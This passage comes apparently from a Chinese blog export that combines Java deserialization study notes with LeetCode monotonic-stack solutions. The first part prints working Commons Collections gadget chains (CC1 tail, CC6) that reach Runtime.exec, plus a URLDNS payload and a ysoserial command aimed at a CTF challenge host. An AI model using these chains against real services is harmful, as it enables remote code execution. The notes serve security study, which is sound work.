construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="java加载字节码方法"><a href="#java加载字节码方法" class="headerlink" title="java加载字节码方法"></a>java加载字节码方法</h2><h3 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h3><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">类的动态加载_哔哩哔哩_bilibili</a></p>
<p>load&#x3D;&gt;find&#x3D;&gt;define</p>
<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h2 id="TemplatesImpl在Shiro-中的利用"><a href="#TemplatesImpl在Shiro-中的利用" class="headerlink" title="TemplatesImpl在Shiro 中的利用"></a>TemplatesImpl在Shiro 中的利用</h2><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h2 id="CommonsBeanutils与无-commons-collections的Shiro反序列化利用"><a href="#CommonsBeanutils与无-commons-collections的Shiro反序列化利用" class="headerlink" title="CommonsBeanutils与无 commons-collections的Shiro反序列化利用"></a>CommonsBeanutils与无 commons-collections的Shiro反序列化利用</h2><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn)</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱 | 离别歌 (leavesongs.com)</a></p>
<p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用 | Bendawang’s site</a></p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Java-runtime类介绍"><a href="#Java-runtime类介绍" class="headerlink" title="Java runtime类介绍"></a>Java runtime类介绍</h3><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<h3 id="LOG4J分析"><a href="#LOG4J分析" class="headerlink" title="LOG4J分析"></a>LOG4J分析</h3><h3 id="表达式上下文"><a href="#表达式上下文" class="headerlink" title="表达式上下文"></a>表达式上下文</h3><h2 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/128221385">CTFSHOW web入门 java反序列化篇（更新中）_ctfshow java_yu22x的博客-CSDN博客</a></p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/110499314">CTFSHOW]反序列化(仅更新必要的题目)_Y4tacker的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/128303093">CTFSHOW web入门 java反序列化篇 web855_ctfshow java_yu22x的博客-CSDN博客</a></p>
<h3 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用ysoserial</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS &quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <tags>
        <tag>安全</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_单调栈</title>
    <url>/2024/08/06/leetcode-%E5%8D%95%E8%B0%83%E6%A0%88/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/9oZFK9/">分享｜【题单】单调栈（矩形面积&#x2F;贡献法&#x2F;最小字典序） - 力扣（LeetCode）</a></p>
<span id="more"></span>

<p>[toc]</p>
<h1 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h1><h3 id="739-每日温度"><a href="#739-每日温度" class="headerlink" title="739. 每日温度"></a><a href="https://leetcode.cn/problems/daily-temperatures/">739. 每日温度</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈模板，太久没写单调栈了，再写一遍</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dailyTemperatures(<span class="type">int</span>[] temperatures) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> temperatures.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty()&amp;&amp;temperatures[i] &gt; temperatures[stack.peekFirst()])&#123;</span><br><span class="line">                res[stack.peekFirst()] = i - stack.peekFirst();</span><br><span class="line">                stack.removeFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.addFirst(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1475-商品折扣后的最终价格"><a href="#1475-商品折扣后的最终价格" class="headerlink" title="1475. 商品折扣后的最终价格"></a><a href="https://leetcode.cn/problems/final-prices-with-a-special-discount-in-a-shop/">1475. 商品折扣后的最终价格</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈裸题</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] finalPrices(<span class="type">int</span>[] prices) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> prices.length;</span><br><span class="line">        <span class="type">int</span>[] res = prices.clone();</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">preIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; prices[i] &lt;= prices[preIndex = stack.getFirst()]) &#123;</span><br><span class="line">                res[preIndex] -= res[i];</span><br><span class="line">                stack.removeFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.addFirst(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1019-链表中的下一个更大节点"><a href="#1019-链表中的下一个更大节点" class="headerlink" title="1019. 链表中的下一个更大节点"></a><a href="https://leetcode.cn/problems/next-greater-node-in-linked-list/">1019. 链表中的下一个更大节点</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] nextLargerNodes(ListNode head) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">cur</span> <span class="operator">=</span> head; cur != <span class="literal">null</span>; cur = cur.next)</span><br><span class="line">            ++n; <span class="comment">// 确定返回值的长度</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">var</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;<span class="type">int</span>[]&gt;(); <span class="comment">// 单调栈（节点值，节点下标）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">cur</span> <span class="operator">=</span> head; cur != <span class="literal">null</span>; cur = cur.next) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st.isEmpty() &amp;&amp; st.peek()[<span class="number">0</span>] &lt; cur.val)</span><br><span class="line">                ans[st.pop()[<span class="number">1</span>]] = cur.val; <span class="comment">// 用当前节点值更新答案</span></span><br><span class="line">            st.push(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;cur.val, i++&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要同时存下标和值</p>
<h3 id="962-最大宽度坡"><a href="#962-最大宽度坡" class="headerlink" title="962. 最大宽度坡"></a><a href="https://leetcode.cn/problems/maximum-width-ramp/">962. 最大宽度坡</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxWidthRamp</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(stack.isEmpty() || nums[i] &lt; nums[stack.getFirst()])&#123;</span><br><span class="line">                stack.addFirst(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty()&amp;&amp;nums[i] &gt;= nums[stack.getFirst()])&#123;</span><br><span class="line">                res = Integer.max(res, i - stack.getFirst());</span><br><span class="line">                stack.removeFirst();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="496-下一个更大元素-I"><a href="#496-下一个更大元素-I" class="headerlink" title="496. 下一个更大元素 I"></a><a href="https://leetcode.cn/problems/next-greater-element-i/">496. 下一个更大元素 I</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈 + hashmap</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] nextGreaterElement(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(res, -<span class="number">1</span>);</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            map.put(nums1[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack.empty()&amp;&amp;nums2[i] &gt; stack.peek())&#123;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(stack.peek()))&#123;</span><br><span class="line">                    res[map.get(stack.peek())] = nums2[i];</span><br><span class="line">                &#125;</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(nums2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="503-下一个更大元素-II"><a href="#503-下一个更大元素-II" class="headerlink" title="503. 下一个更大元素 II"></a><a href="https://leetcode.cn/problems/next-greater-element-ii/">503. 下一个更大元素 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈+两遍遍历</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] nextGreaterElements(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(res, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span> * n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.empty() &amp;&amp; nums[i % n] &gt; nums[stack.peek()]) &#123;</span><br><span class="line">                res[stack.peek()] = nums[i % n];</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i % n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二遍做了，五分钟不到就做完了，变强了（dog）</p>
<h3 id="853-车队"><a href="#853-车队" class="headerlink" title="853. 车队"></a><a href="https://leetcode.cn/problems/car-fleet/">853. 车队</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两辆车形成车队的充要条件是</span><br><span class="line">(p1,v1),（p2, v2) 目的地target</span><br><span class="line">p1 == p2 一定行成车队</span><br><span class="line">另外情况对称性设，p1 &lt; p2</span><br><span class="line">(target - p1)/s1 &lt;= (target - p2)/s2</span><br><span class="line">然后可以预处理下数组</span><br><span class="line">dis[i] = target[i] - pos[i]</span><br><span class="line"></span><br><span class="line">即</span><br><span class="line">dis[i]/v1 &lt;= dis[j]/v2，并且dis[i] &gt;= dis[j] (那么一定有v1 &gt;= v2)</span><br><span class="line">之后排序距离，然后计算时间，就可以求车队数量了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    <span class="type">int</span> dis;</span><br><span class="line">    <span class="type">int</span> speed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">(<span class="type">int</span> dis, <span class="type">int</span> speed)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dis = dis;</span><br><span class="line">        <span class="built_in">this</span>.speed = speed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">carFleet</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] position, <span class="type">int</span>[] speed)</span> &#123;</span><br><span class="line">    Car[] cars = <span class="keyword">new</span> <span class="title class_">Car</span>[position.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; position.length; i++) &#123;</span><br><span class="line">        cars[i] = <span class="keyword">new</span> <span class="title class_">Car</span>(target - position[i], speed[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(cars, (o1, o2) -&gt; Integer.compare(o1.dis, o2.dis));</span><br><span class="line">    Stack&lt;Double&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cars.length; i++) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">t</span> <span class="operator">=</span> (<span class="type">double</span>) cars[i].dis / cars[i].speed;</span><br><span class="line">        <span class="keyword">if</span>(stack.empty())&#123;</span><br><span class="line">            stack.push(t);</span><br><span class="line">            res++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (t &gt; stack.peek()) &#123;</span><br><span class="line">            res++;</span><br><span class="line">            stack.pop();</span><br><span class="line">            stack.push(t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>感觉这道题严格意义不需要用单调栈，栈内最多就一个元素</p>
<h3 id="901-股票价格跨度"><a href="#901-股票价格跨度" class="headerlink" title="901. 股票价格跨度"></a><a href="https://leetcode.cn/problems/online-stock-span/">901. 股票价格跨度</a></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[i]、a[i+1]如果a[i+1]大于a[i]那么我们是可以不管前面的，但是需要记录个数所以需要index</span><br></pre></td></tr></table></figure>

<p>代码</p>
